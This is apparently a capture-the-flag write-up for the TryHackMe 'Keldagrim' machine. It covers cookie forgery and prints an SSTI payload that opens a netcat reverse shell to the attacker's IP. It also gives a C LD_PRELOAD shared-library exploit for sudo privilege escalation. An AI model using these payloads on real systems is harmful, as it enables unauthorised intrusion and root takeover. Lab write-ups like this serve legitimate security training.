---
title: "Keldagrim WriteUp"
categories: [ctf]
date: 2022/07/22
description: TryHackMe Biblioteca WriteUp.
---
# TryHackMe | Keldagrim

Hello everyone,

I will explain the solution of the medium level machine as clearly as i work.

<p align="center">
  <img src="/img/keldagrim_thm/loky.png">
</p>

Let's first scan for open ports and services with nmap.

```bash
sudo nmap -sSCV 10.10.211.169 -T4 -v
```

<p align="center">
  <img src="/img/keldagrim_thm/0.png">
</p>

The web application is running on port 80 and the ssh service is active. let's switch to web application


<p align="center">
  <img src="/img/keldagrim_thm/1.png">
</p>

here we see a cookie with base64. What happens if we change this?

<p align="center">
  <img src="/img/keldagrim_thm/2.png">
</p>

It looks like there is an admin user and let's try to set our cookie accordingly

```bash
└─$ echo -n Z3Vlc3Q= | base64 -d
guest 

└─$ echo -n admin | base64   
YWRtaW4
```

<p align="center">
  <img src="/img/keldagrim_thm/3.png">
</p>

I've logged into admin. Since I don't understand anything here, I tried to interrupt with the burp suite.

<p align="center">
  <img src="/img/keldagrim_thm/4.png">
</p>

When we decoded the "sales" value, it gave us a result. this is the same result we just saw on the admin page.

```bash
└─$ echo -n JDIsMTY1 | base64 -d
$2,165
```
Two things came to mind here. rce and ssti. I wanted to try the ssti because it made more sense.


<p align="center">
  <img src="/img/keldagrim_thm/5.png">
</p>

I verified it's ssti and created a payload to get the reverse shell.

   {{ namespace.__init__.__globals__.os.popen('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.77.152 8787 >/tmp/f').read() }}

<p align="center">
  <img src="/img/keldagrim_thm/6.png">
</p>


<p align="center">
  <img src="/img/keldagrim_thm/7.png">
</p>


```bash
Matching Defaults entries for jed on keldagrim:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User jed may run the following commands on keldagrim:
    (ALL : ALL) NOPASSWD: /bin/ps
jed@keldagrim:~$
```

I saw that the ps command works with sudo. but also that it belongs to the LD_PRELOAD environment

and I researched for privilege escalation

```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

I saved the c codes in the exploit.c file and ran the following commands in the terminal to switch to root session

```bash
gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
ls -al exploit.so
sudo LD_PRELOAD=/tmp/exploit.so ps
```

```bash
whomi

cat /root/root.txt && cat /home/jed/user.txt
```

